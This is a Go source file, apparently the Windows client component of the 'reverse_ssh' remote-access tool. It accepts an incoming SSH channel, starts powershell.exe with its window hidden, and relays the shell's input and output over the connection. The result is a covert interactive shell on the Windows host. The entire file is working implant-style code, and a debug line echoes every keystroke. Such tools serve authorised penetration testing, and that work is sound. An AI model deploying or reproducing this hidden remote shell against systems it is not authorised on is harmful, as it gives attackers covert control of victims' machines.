// +build windows
package client

import (
	"fmt"
	"io"
	"os/exec"
	"syscall"

	"github.com/NHAS/reverse_ssh/internal/server/users"
	"github.com/NHAS/reverse_ssh/pkg/logger"
	"golang.org/x/crypto/ssh"
)

//The basic windows shell handler, as there arent any good golang libraries to work with windows conpty
func shellChannel(user *users.User, newChannel ssh.NewChannel, log logger.Logger) {

	// At this point, we have the opportunity to reject the client's.
	// request for another logical connection
	connection, requests, err := newChannel.Accept()
	if err != nil {
		log.Error("Could not accept channel (%s)", err)
		return
	}
	defer connection.Close()

	go func() {
		defer connection.Close()

		cmd := exec.Command("powershell.exe")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

		stdout, err := cmd.StdoutPipe()
		if err != nil {
			log.Warning("Unable to get stdout pipe: %s", err)
			return
		}

		stderr, err := cmd.StderrPipe()
		if err != nil {
			log.Warning("Unable to get stderr pipe: %s", err)
			return
		}

		go func() {
			defer stderr.Close()
			io.Copy(connection, stderr)
		}()

		go func() {
			defer stdout.Close()

			buff := make([]byte, 1024)
			for {
				n, _ := stdout.Read(buff)

				_, err = connection.Write(buff[:n])
				if err != nil {
					log.Warning("Writing to connection failed: %s", err)
					return
				}
			}
		}()

		stdin, err := cmd.StdinPipe()
		if err != nil {
			log.Warning("Unable to get stdin pipe: %s", err)

			return
		}

		go func() {
			defer stdin.Close()

			buff := make([]byte, 1)
			for {

				_, err := connection.Read(buff)

				if err != nil {
					log.Warning("Reading from connection failed: %s", err)
					return
				}

				fmt.Println(buff, string(buff))

				if buff[0] == 127 {
					stdin.Write([]byte{8, 0})
					connection.Write(buff)
					continue
				}

				connection.Write(buff)

				if buff[0] == 13 {
					stdin.Write([]byte{13, 10})
					continue
				}

				_, err = stdin.Write(buff)
				if err != nil {
					log.Warning("Writing to stdin failed: %s", err)
					return
				}
			}
		}()

		err = cmd.Run()
		if err != nil {
			log.Warning("Run returned an error: %s", err)
			return
		}

	}()

	for req := range requests {
		log.Info("Got request: %s", req.Type)
		switch req.Type {
		case "shell":
			// We only accept the default shell
			// (i.e. no command in the Payload)
			req.Reply(len(req.Payload) == 0, nil)

		case "pty-req":
			req.Reply(true, nil)
		}
	}

}
